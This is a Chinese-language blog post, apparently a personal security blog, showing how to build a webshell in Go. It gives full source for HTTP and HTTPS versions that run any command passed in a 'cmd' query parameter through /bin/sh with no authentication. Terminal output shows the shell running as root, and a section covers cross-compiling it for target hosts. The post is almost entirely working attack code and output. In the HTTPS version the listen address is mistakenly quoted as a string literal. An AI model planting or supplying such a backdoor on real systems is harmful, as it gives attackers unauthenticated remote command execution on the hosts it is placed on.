<!DOCTYPE html><html lang="en"><head><meta name="generator" content="Hexo 3.8.0"><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><title> 如何实现一个基于 Golang 的  webshell？ · TonghuaRoot's BloG. - Cyber security enthusiast, not Hacker.</title><meta name="description" content="如何实现一个基于 Golang 的  webshell？ - TonghuaRoot"><meta name="viewport" content="width=device-width, initial-scale=1"><link rel="icon" href="/favicon.png"><link rel="stylesheet" href="/css/apollo.css"><link rel="search" type="application/opensearchdescription+xml" href="https://tonghuaroot.com/atom.xml" title="TonghuaRoot's BloG. - Cyber security enthusiast, not Hacker."></head><body><div class="wrap"><header><a href="/" class="logo-link"><img src="/favicon.png" alt="logo"></a><ul class="nav nav-list"><li class="nav-list-item"><a href="/" target="_self" class="nav-list-link">BLOG</a></li><li class="nav-list-item"><a href="/archives/" target="_self" class="nav-list-link">ARCHIVE</a></li><li class="nav-list-item"><a href="/about" target="_self" class="nav-list-link">ABOUT</a></li><li class="nav-list-item"><a href="https://twitter.com/tonghuaroot" target="_blank" class="nav-list-link">TWITTE</a></li><li class="nav-list-item"><a href="https://github.com/tonghuaroot" target="_blank" class="nav-list-link">GITHUB</a></li><li class="nav-list-item"><a href="/friends" target="_self" class="nav-list-link">FRS</a></li><li class="nav-list-item"><a href="/atom.xml" target="_self" class="nav-list-link">RSS</a></li></ul></header><main class="container"><div class="post"><article class="post-block"><h1 class="post-title">如何实现一个基于 Golang 的  webshell？</h1><div class="post-info">Jan 1, 2020</div><div class="post-content"><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>在这篇文章中，我将记录一下如何使用Golang实现一个webshell。</p>
<h2 id="0x01-HTTP"><a href="#0x01-HTTP" class="headerlink" title="0x01 HTTP"></a>0x01 HTTP</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">package main</span><br><span class="line"></span><br><span class="line">import (</span><br><span class="line">   &quot;fmt&quot;</span><br><span class="line">   &quot;log&quot;</span><br><span class="line">   &quot;net/http&quot;</span><br><span class="line">   &quot;os&quot;</span><br><span class="line">   &quot;os/exec&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">var shell = &quot;/bin/sh&quot;</span><br><span class="line">var shellArg = &quot;-c&quot;</span><br><span class="line"></span><br><span class="line">func main() &#123;</span><br><span class="line">   if len(os.Args) != 2 &#123;</span><br><span class="line">      fmt.Printf(&quot;Usage: %s &lt;listenAddress&gt;\n&quot;, os.Args[0])</span><br><span class="line">      fmt.Printf(&quot;Example: %s localhost:8080\n&quot;, os.Args[0])</span><br><span class="line">      os.Exit(1)</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   http.HandleFunc(&quot;/&quot;, requestHandler)</span><br><span class="line">   log.Println(&quot;Listening for HTTP requests.&quot;)</span><br><span class="line">   err := http.ListenAndServe(os.Args[1], nil)</span><br><span class="line">   if err != nil &#123;</span><br><span class="line">      log.Fatal(&quot;Error creating server. &quot;, err)</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func requestHandler(writer http.ResponseWriter, request *http.Request) &#123;</span><br><span class="line">   // Get command to execute from GET query parameters</span><br><span class="line">   cmd := request.URL.Query().Get(&quot;cmd&quot;)</span><br><span class="line">   if cmd == &quot;&quot; &#123;</span><br><span class="line">      fmt.Fprintln(</span><br><span class="line">         writer,</span><br><span class="line">         &quot;No command provided. Example: /?cmd=whoami&quot;)</span><br><span class="line">      return</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   log.Printf(&quot;Request from %s: %s\n&quot;, request.RemoteAddr, cmd)</span><br><span class="line">   fmt.Fprintf(writer, &quot;You requested command: %s\n&quot;, cmd)</span><br><span class="line"></span><br><span class="line">   // Run the command</span><br><span class="line">   command := exec.Command(shell, shellArg, cmd)</span><br><span class="line">   output, err := command.Output()</span><br><span class="line">   if err != nil &#123;</span><br><span class="line">      fmt.Fprintf(writer, &quot;Error with command.\n%s\n&quot;, err.Error())</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   // Write output of command to the response writer interface</span><br><span class="line">   fmt.Fprintf(writer, &quot;Output: \n%s\n&quot;, output)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="1.png" alt="image"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ec2-user@kali:~/go/src/webshell$ go install webshell</span><br><span class="line">ec2-user@kali:~/go/src/webshell$ ~/go/bin/webshell 0.0.0.0:80</span><br><span class="line">2020/01/01 14:05:55 Listening for HTTP requests.</span><br><span class="line">2020/01/01 14:05:55 Error creating server. listen tcp 0.0.0.0:80: bind: permission denied</span><br><span class="line">ec2-user@kali:~/go/src/webshell$ sudo ~/go/bin/webshell 0.0.0.0:80</span><br><span class="line">2020/01/01 14:06:00 Listening for HTTP requests.</span><br><span class="line">2020/01/01 14:06:04 Request from 54.222.196.177:61772: ifconfig</span><br><span class="line">^C</span><br><span class="line">ec2-user@kali:~/go/src/webshell$</span><br></pre></td></tr></table></figure></p>
<p><img src="2.png" alt="image"></p>
<h2 id="0x02-HTTPS"><a href="#0x02-HTTPS" class="headerlink" title="0x02 HTTPS"></a>0x02 HTTPS</h2><p>注意把证书和私钥配上就可以走HTTPS了。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">package main</span><br><span class="line"></span><br><span class="line">import (</span><br><span class="line">   &quot;fmt&quot;</span><br><span class="line">   &quot;log&quot;</span><br><span class="line">   &quot;net/http&quot;</span><br><span class="line">   &quot;os&quot;</span><br><span class="line">   &quot;os/exec&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">var shell = &quot;/bin/sh&quot;</span><br><span class="line">var shellArg = &quot;-c&quot;</span><br><span class="line"></span><br><span class="line">func main() &#123;</span><br><span class="line">   if len(os.Args) != 2 &#123;</span><br><span class="line">      fmt.Printf(&quot;Usage: %s &lt;listenAddress&gt;\n&quot;, os.Args[0])</span><br><span class="line">      fmt.Printf(&quot;Example: %s localhost:8080\n&quot;, os.Args[0])</span><br><span class="line">      os.Exit(1)</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   http.HandleFunc(&quot;/&quot;, requestHandler)</span><br><span class="line">   log.Println(&quot;Listening for HTTPS requests.&quot;)</span><br><span class="line">   err := http.ListenAndServeTLS( </span><br><span class="line">      &quot;os.Args[1]&quot;, </span><br><span class="line">      &quot;cert.pem&quot;, </span><br><span class="line">      &quot;privateKey.pem&quot;, </span><br><span class="line">      nil, </span><br><span class="line">   )</span><br><span class="line">   if err != nil &#123;</span><br><span class="line">      log.Fatal(&quot;Error creating server. &quot;, err)</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func requestHandler(writer http.ResponseWriter, request *http.Request) &#123;</span><br><span class="line">   // Get command to execute from GET query parameters</span><br><span class="line">   cmd := request.URL.Query().Get(&quot;cmd&quot;)</span><br><span class="line">   if cmd == &quot;&quot; &#123;</span><br><span class="line">      fmt.Fprintln(</span><br><span class="line">         writer,</span><br><span class="line">         &quot;No command provided. Example: /?cmd=whoami&quot;)</span><br><span class="line">      return</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   log.Printf(&quot;Request from %s: %s\n&quot;, request.RemoteAddr, cmd)</span><br><span class="line">   fmt.Fprintf(writer, &quot;You requested command: %s\n&quot;, cmd)</span><br><span class="line"></span><br><span class="line">   // Run the command</span><br><span class="line">   command := exec.Command(shell, shellArg, cmd)</span><br><span class="line">   output, err := command.Output()</span><br><span class="line">   if err != nil &#123;</span><br><span class="line">      fmt.Fprintf(writer, &quot;Error with command.\n%s\n&quot;, err.Error())</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   // Write output of command to the response writer interface</span><br><span class="line">   fmt.Fprintf(writer, &quot;Output: \n%s\n&quot;, output)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p><img src="3.png" alt="image"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ec2-user@kali:~/go/src/httpswebshell$ curl 127.0.0.1:443/?cmd=id</span><br><span class="line">You requested command: id</span><br><span class="line">Output:</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br></pre></td></tr></table></figure></p>
<p><img src="4.png" alt="image"></p>
<h2 id="0x03-使用方法（交叉编译）"><a href="#0x03-使用方法（交叉编译）" class="headerlink" title="0x03 使用方法（交叉编译）"></a>0x03 使用方法（交叉编译）</h2><p>需要针对目标主机的类型，将其编译为对应的可执行文件。<br>本地测试命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo go run ~/go/src/httpswebshell/webshell.go 0.0.0.0:443</span><br><span class="line">go install httpswebshell # 编译</span><br></pre></td></tr></table></figure></p>
<h2 id="0x04-后记"><a href="#0x04-后记" class="headerlink" title="0x04 后记"></a>0x04 后记</h2><p>记录一下使用Golang实现webshell，走HTTP(S)。</p>
<h2 id="0x05-参考文献"><a href="#0x05-参考文献" class="headerlink" title="0x05 参考文献"></a>0x05 参考文献</h2><p>[1] Security with Go</p>
</div></article></div></main><footer><div class="paginator"><a href="/2020/02/28/Zero-trust-in-my-eyes/" class="prev">PREV</a><a href="/2019/11/25/AWS-IAM-MFA-force-console-no-use-MFA-in-CLI/" class="next">NEXT</a></div><div class="copyright"><p>© 2008 - 2022 <a href="https://tonghuaroot.com">TonghuaRoot</a>.</p></div></footer></div><script async src="//cdn.bootcss.com/mathjax/2.7.0/MathJax.js?config=TeX-MML-AM_CHTML" integrity="sha384-crwIf/BuaWM9rM65iM+dWFldgQ1Un8jWZMuh3puxb8TOY9+linwLoI7ZHZT+aekW" crossorigin="anonymous"></script></body></html>